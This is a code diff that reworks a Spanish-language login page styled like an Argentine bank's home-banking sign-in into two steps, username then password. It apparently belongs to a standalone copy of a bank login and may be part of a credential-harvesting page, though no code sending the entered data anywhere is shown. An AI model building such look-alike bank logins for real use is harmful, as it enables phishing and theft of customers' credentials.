@@ -359,7 +359,7 @@
             animation: fadeIn 0.3s ease forwards;
         }
 
-        /* ===== BOTÓN ===== */
+        /* ===== BOTÓN CONTINUAR ===== */
         .boton {
             width: 100%;
             padding: 16px;
@@ -379,6 +379,40 @@
             background: #e8f0fe;
             transform: scale(1.02);
             box-shadow: 0 6px 24px rgba(255, 255, 255, 0.15);
+        }
+
+        /* ===== BOTÓN SIGUIENTE (para pasar a clave) ===== */
+        .boton-siguiente {
+            width: 100%;
+            padding: 16px;
+            background: #00a5df;
+            color: white;
+            font-weight: bold;
+            font-size: 17px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            margin-top: 20px;
+        }
+
+        .boton-siguiente:hover {
+            background: #0088c4;
+            transform: scale(1.02);
+            box-shadow: 0 6px 24px rgba(0, 165, 223, 0.3);
+        }
+
+        .boton-siguiente:disabled {
+            background: #555;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .boton-siguiente:disabled:hover {
+            background: #555;
+            transform: none;
+            box-shadow: none;
         }
 
         /* ===== FORGOT TEXT ===== */
@@ -424,6 +458,11 @@
         /* ===== MOBILE INFO (oculto en PC) ===== */
         .mobileInfo {
             display: none;
+        }
+
+        /* ===== OCULTAR CAMPOS ===== */
+        .oculto {
+            display: none !important;
         }
 
         /* ===== FOOTER ===== */
@@ -558,6 +597,12 @@
 
             .boton {
                 background: rgba(255, 255, 255, 0.9);
+                margin-top: 12px;
+            }
+
+            .boton-siguiente {
+                background: #00a5df;
+                color: white;
                 margin-top: 12px;
             }
 
@@ -789,46 +834,65 @@
                             </div>
                         </div>
 
-                        <div class="row">
-                            <h2 class="widthVolver remove-margin-bottom">
-                                Ingresá tus datos
-                            </h2>
-                        </div>
-                        <p class="info-text remove-margin margin-top-small">
-                            Si gestionaste el alta en el cajero automático debés ingresar como usuario tu CUIL
-                        </p>
+                        <!-- ===== PASO 1: USUARIO ===== -->
+                        <div id="pasoUsuario">
+                            <div class="row">
+                                <h2 class="widthVolver remove-margin-bottom">
+                                    Ingresá tus datos
+                                </h2>
+                            </div>
+                            <p class="info-text remove-margin margin-top-small">
+                                Si gestionaste el alta en el cajero automático debés ingresar como usuario tu CUIL
+                            </p>
 
-                        <div class="position-relative notmobile">
-                            <div class="check-cont">
-                                <div class="checkRCont" onclick="toggleTeclado(this)">
-                                    <div class="line short"></div>
-                                    <div class="line long"></div>
+                            <div class="position-relative notmobile">
+                                <div class="check-cont">
+                                    <div class="checkRCont" onclick="toggleTeclado(this)">
+                                        <div class="line short"></div>
+                                        <div class="line long"></div>
+                                    </div>
                                 </div>
+                                <p class="widthVolver remove-margin margin-left-large">Teclado virtual</p>
                             </div>
-                            <p class="widthVolver remove-margin margin-left-large">Teclado virtual</p>
+
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTIwIDIxdi0yYTQgNCAwIDAgMC00LTRINGE0IDQgMCAwIDAtNCA0djIiLz48Y2lyY2xlIGN4PSIxMiIgY3k9IjciIHI9IjQiLz48L3N2Zz4=" alt="Usuario">
+                                </div>
+                                <input class="input" autocomplete="off" type="text" placeholder="Usuario" id="campoUsuario" oninput="validarUsuario()">
+                            </div>
+
+                            <!-- Botón CONTINUAR para pasar a clave -->
+                            <button class="boton" type="button" onclick="siguientePaso()" id="btnSiguiente">
+                                CONTINUAR
+                            </button>
                         </div>
 
-                        <!-- Campo Usuario (visible inicialmente) -->
-                        <div class="input-wrapper" id="usuarioWrapper">
-                            <div class="input-icon">
-                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTIwIDIxdi0yYTQgNCAwIDAgMC00LTRINGE0IDQgMCAwIDAtNCA0djIiLz48Y2lyY2xlIGN4PSIxMiIgY3k9IjciIHI9IjQiLz48L3N2Zz4=" alt="Usuario">
+                        <!-- ===== PASO 2: CLAVE (oculto inicialmente) ===== -->
+                        <div id="pasoClave" class="oculto">
+                            <div class="row">
+                                <h2 class="widthVolver remove-margin-bottom">
+                                    Ingresá tu clave
+                                </h2>
                             </div>
-                            <input class="input" autocomplete="off" type="text" placeholder="Usuario" id="campoUsuario" onkeyup="verificarUsuario(this.value)" onblur="verificarUsuario(this.value)">
+
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+PHBhdGggZD0iTTcgMTFWN2E1IDUgMCAwIDEgMTAgMHY0Ii8+PC9zdmc+" alt="Clave">
+                                </div>
+                                <input class="input" autocomplete="new-password" type="password" placeholder="Clave personal" id="campoClave">
+                            </div>
+
+                            <button class="boton" type="button" onclick="continuar()">
+                                INGRESAR
+                            </button>
+
+                            <p class="forgot-text" onclick="volverUsuario()">
+                                ← Volver al usuario
+                            </p>
                         </div>
 
-                        <!-- Campo Clave (oculto inicialmente) -->
-                        <div class="input-wrapper" id="claveWrapper" style="display: none;">
-                            <div class="input-icon">
-                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+PHBhdGggZD0iTTcgMTFWN2E1IDUgMCAwIDEgMTAgMHY0Ii8+PC9zdmc+" alt="Clave">
-                            </div>
-                            <input class="input" autocomplete="new-password" type="password" placeholder="Clave personal" id="campoClave">
-                        </div>
-
-                        <button class="boton" type="button" onclick="continuar()">
-                            CONTINUAR
-                        </button>
-
-                        <p class="forgot-text">
+                        <p class="forgot-text" id="forgotUsuario">
                             Olvidé o bloqueé mi Clave y/o Usuario
                         </p>
                         <div class="login-help">
@@ -878,53 +942,58 @@
     </div>
 
     <script>
-        var timeoutId = null;
-
         function toggleTeclado(element) {
             element.classList.toggle('active');
         }
 
-        function verificarUsuario(valor) {
-            // Limpiar el timeout anterior
-            if (timeoutId) {
-                clearTimeout(timeoutId);
+        function validarUsuario() {
+            var usuario = document.getElementById('campoUsuario').value;
+            var btn = document.getElementById('btnSiguiente');
+            
+            if (usuario.length >= 3) {
+                btn.style.opacity = '1';
+                btn.disabled = false;
+            } else {
+                btn.style.opacity = '0.5';
+                btn.disabled = true;
+            }
+        }
+
+        function siguientePaso() {
+            var usuario = document.getElementById('campoUsuario').value;
+            
+            if (usuario.length < 3) {
+                alert('Por favor, ingresá tu usuario (mínimo 3 caracteres).');
+                document.getElementById('campoUsuario').focus();
+                return;
             }
 
-            var usuarioWrapper = document.getElementById('usuarioWrapper');
-            var claveWrapper = document.getElementById('claveWrapper');
+            // Ocultar paso 1
+            document.getElementById('pasoUsuario').style.display = 'none';
+            // Mostrar paso 2 con animación
+            var pasoClave = document.getElementById('pasoClave');
+            pasoClave.classList.remove('oculto');
+            pasoClave.style.display = 'block';
+            pasoClave.style.animation = 'fadeIn 0.3s ease forwards';
+            
+            // Enfocar campo clave
+            setTimeout(function() {
+                document.getElementById('campoClave').focus();
+            }, 400);
+        }
 
-            if (valor.length >= 3) {
-                // Si tiene 3 o más caracteres, esperar 500ms para confirmar
-                timeoutId = setTimeout(function() {
-                    // Ocultar campo usuario con animación
-                    usuarioWrapper.classList.add('fade-out');
-                    setTimeout(function() {
-                        usuarioWrapper.style.display = 'none';
-                        // Mostrar campo clave
-                        claveWrapper.style.display = 'block';
-                        claveWrapper.classList.add('fade-in');
-                        document.getElementById('campoClave').focus();
-                    }, 300);
-                }, 500);
-            } else if (valor.length === 0) {
-                // Si está vacío, mostrar usuario y ocultar clave inmediatamente
-                usuarioWrapper.style.display = 'block';
-                usuarioWrapper.classList.remove('fade-out');
-                claveWrapper.style.display = 'none';
-                claveWrapper.classList.remove('fade-in');
-                document.getElementById('campoClave').value = '';
-            }
+        function volverUsuario() {
+            // Ocultar paso 2
+            document.getElementById('pasoClave').style.display = 'none';
+            document.getElementById('pasoClave').classList.add('oculto');
+            // Mostrar paso 1
+            document.getElementById('pasoUsuario').style.display = 'block';
+            document.getElementById('campoUsuario').focus();
         }
 
         function continuar() {
             var usuario = document.getElementById('campoUsuario').value;
             var clave = document.getElementById('campoClave').value;
-            
-            if (usuario.length === 0) {
-                alert('Por favor, ingresá tu usuario.');
-                document.getElementById('campoUsuario').focus();
-                return;
-            }
             
             if (clave.length === 0) {
                 alert('Por favor, ingresá tu clave.');
@@ -938,14 +1007,22 @@
         // Permitir presionar Enter para continuar
         document.addEventListener('keydown', function(event) {
             if (event.key === 'Enter') {
-                var usuario = document.getElementById('campoUsuario').value;
-                var clave = document.getElementById('campoClave').value;
+                var pasoUsuario = document.getElementById('pasoUsuario');
+                var pasoClave = document.getElementById('pasoClave');
                 
-                if (usuario.length > 0 && clave.length > 0) {
+                if (pasoUsuario.style.display !== 'none') {
+                    // Estamos en el paso usuario
+                    siguientePaso();
+                } else if (pasoClave.style.display !== 'none' && !pasoClave.classList.contains('oculto')) {
+                    // Estamos en el paso clave
                     continuar();
                 }
             }
         });
+
+        // Inicializar el botón
+        document.getElementById('btnSiguiente').disabled = true;
+        document.getElementById('btnSiguiente').style.opacity = '0.5';
     </script>
 
 </body>
